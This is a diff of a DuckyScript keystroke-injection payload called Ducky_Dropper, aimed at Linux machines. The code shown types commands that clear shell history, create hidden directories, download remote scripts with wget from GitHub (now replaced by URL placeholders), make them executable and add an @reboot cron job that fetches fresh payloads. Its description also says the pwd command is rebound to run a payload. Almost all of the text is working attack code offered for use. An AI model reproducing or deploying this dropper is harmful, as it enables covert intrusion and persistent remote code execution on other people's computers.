@@ -4,6 +4,9 @@ REM TARGET OS: Linux (tested on Kali Linux release 2025.2)
 REM DESCRIPTION: --> See README.md for full information <--
 REM DESCRIPTION: This is the delivery system for the initial gathering and setup of Ducky_Dropper (cron_dropper.sh and payload.sh). It gathers the scripts, gives them execution permissions, places them in hidden directories, creates a cronjob that will call for new payloads 60 seconds after machine boot (cron_dropper.sh), and binds the pwd command to execute payload.sh.
 
+DEFINE #CRON_DROPPER https://raw.githubusercontent.com/place/source/to/payload/here
+DEFINE #PAYLOAD https://raw.githubusercontent.com/place/source/to/payload/here
+
 REM Begin attack:
 ATTACKMODE HID
 DELAY 1000
@@ -15,7 +18,8 @@ DELAY 300
 REM Unsetting terminal history, creating directories to host scripts, grabbing cron_dropper.sh and payload.sh:
 STRINGLN unset HISTFILE
 STRINGLN mkdir /home/$USER/.cronfg && mkdir /home/$USER/.confg
-STRINGLN wget -q -P /home/$USER/.cronfg https://raw.githubusercontent.com/OSINTI4L/DuckyScript-Payloads/refs/heads/main/Payloads/Ducky_Dropper/cron_dropper.sh && wget -q -P /home/$USER/.confg https://raw.githubusercontent.com/OSINTI4L/DuckyScript-Payloads/refs/heads/main/Payloads/Ducky_Dropper/payload.sh
+STRINGLN wget -q -P /home/$USER/.cronfg #CRON_DROPPER
+STRINGLN wget -q -P /home/$USER/.confg #PAYLOAD
 
 REM Giving execution permissions to cron_dropper.sh & payload.sh, and adding cron_dropper.sh to crontab to be executed 60 seconds after reboot to fetch updated payloads:
 STRINGLN chmod +x /home/$USER/.confg/*.sh; chmod +x /home/$USER/.cronfg/*.sh; crontab -l > crontemp; echo "@reboot sleep 60 && ~/.cronfg/cron_dropper.sh" >> crontemp; crontab crontemp; rm -f crontemp
